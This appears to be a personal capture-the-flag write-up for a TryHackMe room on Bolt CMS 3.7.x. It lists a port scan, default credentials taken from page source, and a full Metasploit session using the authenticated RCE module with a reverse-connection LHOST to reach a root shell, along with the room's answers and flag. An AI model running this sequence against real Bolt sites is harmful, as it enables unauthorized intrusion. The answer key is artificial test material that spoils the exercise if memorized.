---
a hero is unleashed, This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution.
---
### rustscan

> found port 22, 80, 8000

> password found in (source code)

*Content Management System (CMS). These web applications are used to manage content on a website. For example, blogs, news sites, e-commerce sites and more! *

> gobuster, feroxbuster nothing so search on Google like *bolt cms default login page*

> then Go to the login page at http:\//yourdomain.com/bolt Sign up with your: Username or email.

> login to IP:8000/bolt/login with Bolt:boltadmin123 and get version CMS *Bolt 3.7.1*

[bolt CMS 3.7.0](https://www.exploit-db.com/exploits/48296)

### Metasploit

```
msfconsole -q 
```

```
search bolt
```

```bolt authenticated rce
use 0
```

```
show options
```

```use ur vpn
set LHOST vpn-ip
```

```
set LPORT 4444
```

```
set RHOST IP-room
```

```
set USERNAME Bolt
```

```
set PASSWORD boltadmin123
```

```
run
```

```root
whoami
```

```
ls
```

```
cd /home
```

```
cat flag.txt
```

==THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}==

- What port number has a web server with a CMS running? *8000*
- What is the username we can find in the CMS? *Bolt*
- What is the password we can find for the username? *boltadmin123*
- What version of the CMS is installed on the server? (Ex: Name 1.1.1) *Bolt 3.7.1*
- There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID? *48296*
- Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run `apt update` then `apt install metasploit-framework`
*exploit/unix/webapp/bolt_authenticated_rce*
- Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit *No answer needed*
- Look for flag.txt inside the machine. *THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}*

[[Break Out The Cage]]

